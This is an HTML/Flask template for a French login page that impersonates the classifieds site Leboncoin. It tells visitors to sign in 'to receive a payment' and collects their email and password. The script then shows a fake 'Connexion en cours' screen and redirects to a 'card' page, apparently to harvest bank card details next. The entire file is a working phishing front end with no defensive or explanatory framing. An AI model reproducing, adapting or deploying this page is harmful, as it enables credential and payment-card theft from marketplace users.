<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connexion</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: Arial, sans-serif;
            background-color: white;
            display: flex;
            justify-content: center;
            align-items: flex-start;
            min-height: 100vh;
            position: relative;
            overflow-y: auto;
        }

        /* Logo en haut, étendu sur toute la largeur et en arrière-plan */
        .header-logo {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 70px;
            object-fit: cover;
            z-index: 0;
            filter: contrast(1.2);
        }

        /* Cadre du formulaire */
        .platform {
            background-color: white;
            border-radius: 20px;
            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.1);
            padding: 40px;
            max-width: 600px;
            width: 100%;
            text-align: center;
            position: relative;
            z-index: 1;
            margin-top: 70px;
            margin-bottom: 150px;
        }

        .platform h1 {
            color: black; /* Texte "Bonjour !" en noir */
            margin-bottom: 20px;
            font-size: 28px;
        }

        .platform p {
            margin-bottom: 20px;
            color: #555;
        }

        .input-field {
            width: 100%;
            padding: 15px;
            margin: 15px 0;
            border: 2px solid #e0e0e0;
            border-radius: 10px;
            font-size: 16px;
            transition: border-color 0.3s ease, box-shadow 0.3s ease;
        }

        .input-field:focus {
            border-color: #007BFF; /* Bordure bleue au focus */
            box-shadow: 0 0 10px rgba(0, 123, 255, 0.2);
            outline: none;
        }

        .input-field::placeholder {
            color: #999;
        }

        .button {
            background-color: #007BFF; /* Bouton en bleu */
            color: white;
            padding: 18px 36px;
            text-align: center;
            text-decoration: none;
            display: inline-block;
            font-size: 18px;
            margin: 30px 0;
            cursor: pointer;
            border: none;
            border-radius: 10px;
            transition: background-color 0.3s ease, transform 0.2s ease, box-shadow 0.3s ease;
            box-shadow: 0 4px 10px rgba(0, 123, 255, 0.3); /* Ombre bleue */
        }

        .button:hover {
            background-color: #0056b3; /* Bleu plus foncé au survol */
            transform: translateY(-2px);
            box-shadow: 0 6px 15px rgba(0, 123, 255, 0.4);
        }

        .button:active {
            transform: translateY(0);
            box-shadow: 0 4px 10px rgba(0, 123, 255, 0.3);
        }

        .password-container {
            position: relative;
            width: 100%;
        }

        .toggle-password {
            position: absolute;
            right: 10px;
            top: 50%;
            transform: translateY(-50%);
            cursor: pointer;
            width: 24px;
            height: 24px;
        }

        .toggle-password img {
            width: 100%;
            height: 100%;
        }

        /* Logo en bas, étendu sur toute la largeur */
        .footer-logo {
            position: absolute;
            bottom: 0;
            left: 0;
            width: 100%;
            height: auto;
            z-index: 0;
            opacity: 0.8;
        }

        /* Écran de chargement */
        .loading-screen {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(255, 255, 255, 0.9);
            display: flex;
            justify-content: center;
            align-items: center;
            font-size: 24px;
            color: #007BFF;
            z-index: 1000;
            display: none;
        }
    </style>
</head>
<body>
    <!-- Logo en haut, étendu sur toute la largeur et en arrière-plan -->
    <a href="https://www.leboncoin.fr" target="_blank">
        <img src="https://raw.githubusercontent.com/zapata225/lebon/refs/heads/main/Capture%20d%E2%80%99%C3%A9cran%202025-02-24%20110632.png" alt="Logo LeBoncoin" class="header-logo">
    </a>

    <!-- Plateforme de connexion -->
    <div class="platform">
        <h1>Bonjour !</h1>
        <p>Connectez-vous pour recevoir un paiement.</p>
        
        <!-- Formulaire de connexion -->
        <form id="loginForm" action="{{ url_for('connexion') }}" method="POST" onsubmit="submitForm(event)">
            <!-- Champ pour l'e-mail -->
            <input type="email" name="email" class="input-field" placeholder="E-mail" required>

            <!-- Conteneur pour le mot de passe -->
            <div class="password-container">
                <input type="password" id="password" name="password" class="input-field" placeholder="Mot de Passe" required>
                <span class="toggle-password" onclick="togglePassword()">
                    <img src="https://cdn-icons-png.flaticon.com/512/565/565655.png" alt="Afficher" id="eye-icon"> <!-- Icône d'œil -->
                </span>
            </div>

            <!-- Bouton de connexion -->
            <button type="submit" class="button">Se connecter</button>
        </form>
    </div>

    <!-- Logo en bas, étendu sur toute la largeur -->
    <img src="https://github.com/zapata225/lebon/blob/main/Capture%20d%E2%80%99%C3%A9cran%202025-02-24%20115029.png?raw=true" alt="Logo LeBoncoin Bas" class="footer-logo">

    <!-- Écran de chargement -->
    <div class="loading-screen" id="loading-screen">
        Connexion en cours...
    </div>

    <script>
        // Fonction pour afficher/masquer le mot de passe
        function togglePassword() {
            const passwordInput = document.getElementById('password');
            const eyeIcon = document.getElementById('eye-icon');

            if (passwordInput.type === 'password') {
                passwordInput.type = 'text';
                eyeIcon.src = 'https://cdn-icons-png.flaticon.com/512/565/565649.png'; // Icône œil barré
            } else {
                passwordInput.type = 'password';
                eyeIcon.src = 'https://cdn-icons-png.flaticon.com/512/565/565655.png'; // Icône œil ouvert
            }
        }

        // Fonction pour gérer la soumission du formulaire
        function submitForm(event) {
            event.preventDefault(); // Empêche la soumission par défaut

            const loadingScreen = document.getElementById('loading-screen');
            loadingScreen.style.display = 'flex'; // Affiche l'écran de chargement

            // Simuler une connexion de 1 secondes
            setTimeout(() => {
                loadingScreen.style.display = 'none'; // Masque l'écran de chargement
                window.location.href = "{{ url_for('card') }}"; // Redirige vers card.html
            }, 1000);
        }
    </script>
</body>
</html>
